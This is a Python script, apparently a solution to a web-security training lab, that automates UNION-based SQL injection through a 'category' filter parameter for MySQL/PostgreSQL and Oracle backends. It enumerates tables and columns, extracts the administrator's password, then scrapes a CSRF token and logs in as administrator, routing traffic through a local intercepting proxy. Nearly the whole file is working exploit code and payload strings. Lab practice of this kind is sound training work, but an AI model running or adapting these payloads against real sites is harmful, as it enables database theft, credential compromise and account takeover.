import sys
import argparse
import logging
import urllib3
import time

import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DATABASE = "public"

HEADERS = {
    "X-Pwnfox-Color":"cyan"
}

PROXIES = {
    "http": "127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S"
)

# m - mysql/mssql, o - oracle
Mtable_payload = "filter?category=Gts' union SELECT table_schema,table_name FROM information_schema.columns -- "
Mcolumn_payload = "filter?category=Gts' union SELECT table_name,column_name FROM information_schema.columns%20 -- "
Otable_payload = "filter?category=Gs' union select owner,table_name from all_tables WHERE owner NOT IN ('SYS', 'SYSTEM', 'MDSYS', 'CTXSYS') -- "
Ocolumn_payload = "filter?category=Gs' union SELECT table_name,column_name FROM all_tab_columns%20 --"

def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--no-proxy",help="to use no proxy",default=False,action="store_true")
    parser.add_argument("-o", "--oracle", help="signify oracle database backend",default=False,action="store_true")
    parser.add_argument("url",help="vulnerable resource link")
    return parser.parse_args()


def find_table(url:str, no_proxy: bool,dbms:bool):

    if dbms:
        tUrl = url+Otable_payload
    else:
        tUrl = url+Mtable_payload



    if not no_proxy:
        resp = requests.get(tUrl,headers=HEADERS,proxies=PROXIES,verify=False)
    else:
        resp = requests.get(tUrl,headers=HEADERS)

    soup = BeautifulSoup(resp.text, "html.parser")

    results = []

    for row in soup.find_all("tr"):
        th = row.find("th")
        td = row.find("td")

        if not th or not td:
            continue

        schema = th.text.strip()
        table = td.text.strip()


        if dbms:
            if schema == "PETER"  and table != "PRODUCTS":
                results.append(table)
        else:
            if schema == "public"  and table != "products":
                results.append(table)


    return results[0]

def find_column(url:str, no_proxy:bool,table:str,dbms:bool):

    if dbms:
        cUrl = url + Ocolumn_payload
    else:
        cUrl = url + Mcolumn_payload

    log.info(f"column payload: {cUrl}")

    if not no_proxy:
        resp = requests.get(cUrl,headers=HEADERS,proxies=PROXIES,verify=False)
    else:
        resp = requests.get(cUrl,headers=HEADERS)

    soup = BeautifulSoup(resp.text, "html.parser")

    columns = {
        "username": [],
        "password": []
    }

    for row in soup.find_all("tr"):
        th = row.find("th")
        td = row.find("td")

        if not th or not td:
            continue

        table_name = th.text.strip().lower()
        column_name = td.text.strip().lower()

        if table_name == table.lower():
            if "username" in column_name:
                columns["username"].append(column_name)
            elif "password" in column_name:
                columns["password"].append(column_name)

    return columns


def extract_password(url:str,no_proxy:bool,table:str,user:str,passwd:str,dbms:bool):

    Mpassword_payload = f"filter?category=Gts' union SELECT {user},{passwd} FROM public.{table} -- "
    Opassword_payload = f"filter?category=Gts' union SELECT {user},{passwd} FROM {table} -- "

    if dbms:
        password_payload = Opassword_payload
    else:
        password_payload = Mpassword_payload

    if not no_proxy:
        resp = requests.get(url+password_payload,headers=HEADERS,proxies=PROXIES,verify=False)
    else:
        resp = requests.get(url+password_payload,headers=HEADERS)

    soup = BeautifulSoup(resp.text,"html.parser")

    password = soup.find("th", string="administrator").find_next_sibling("td").text.strip()

    return password

def extract_csrf(html):
    soup = BeautifulSoup(html, "html.parser")

    csrf_input = soup.find("input", attrs={"name": "csrf"})

    if not csrf_input:
        print("[!] CSRF input not found. Dumping HTML snippet:\n")
        print(html)
        exit(1)

    return csrf_input.get("value")

def check_success(url:str,no_proxy:bool,passwd):

    session = requests.Session()

    if not no_proxy:
        session.proxies.update(PROXIES)

    session.verify = False

    session.headers.update(HEADERS)

    log.info("sending GET request to recieve CSRF token")

    resp = session.get(url+"login")

    csrf = extract_csrf(resp.text)

    log.info(f"csrf token extracted: {csrf}")

    payload = {
        "csrf": csrf,
        "username":"administrator",
        "password": passwd
    }

    log.info("sending login payload")

    resp = session.post(url+"login",data=payload,allow_redirects=False)

    if resp.status_code == 302:
        time.sleep(2)
        r = session.get(url)

        if "Congratulations, you solved the lab!" in r.text:
             log.info("✅ Logged In as ADMINISTRATOR")
        else:
            log.info("probing again...")
            time.sleep(2)
            r = session.get(url)
            if "Congratulations, you solved the lab!" in r.text:
                 log.info("✅ Logged In as ADMINISTRATOR")
            else:
                log.info("❌ failed!")



def exploit(url:str, no_proxy:bool,dbms:bool):

    table = find_table(url,no_proxy,dbms)
    log.info(f"[+] found table: {table}")

    user_col = find_column(url,no_proxy,table,dbms)["username"][0]
    pass_col = find_column(url,no_proxy,table,dbms)["password"][0]

    log.info(f"[+] found username column: {user_col}")
    log.info(f"[+] found password column: {pass_col}")

    admin_pass = extract_password(url,no_proxy,table,user_col,pass_col,dbms)

    log.info(f"[+] found admin password: {admin_pass}")

    check_success(url,no_proxy,admin_pass)


def normalize_url(url: str):
    if not url.endswith('/'):
        url = url + "/"
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy,args.oracle)
